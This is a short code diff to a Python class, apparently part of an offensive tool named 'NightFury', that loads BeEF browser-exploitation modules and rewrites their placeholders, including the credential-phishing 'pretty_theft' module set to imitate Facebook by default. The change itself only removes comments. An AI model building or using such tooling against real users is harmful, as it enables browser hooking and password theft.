@@ -40,11 +40,11 @@ class BeEFIntegration:
             with open(command_js_path, 'r') as f:
                 js_content = f.read()
 
-            # Re-engineer: Remove BeEF-specific placeholders or replace with NightFury ones
+            
             js_content = js_content.replace("<%= @command_url %>", "/api/v1/callback")
             js_content = js_content.replace("<%= @command_id %>", "0")
             
-            # Handle pretty_theft specific placeholders
+            
             if name == "pretty_theft":
                 choice = config_overrides.get("choice", "Facebook") if config_overrides else "Facebook"
                 js_content = js_content.replace("<%= @choice %>", choice)
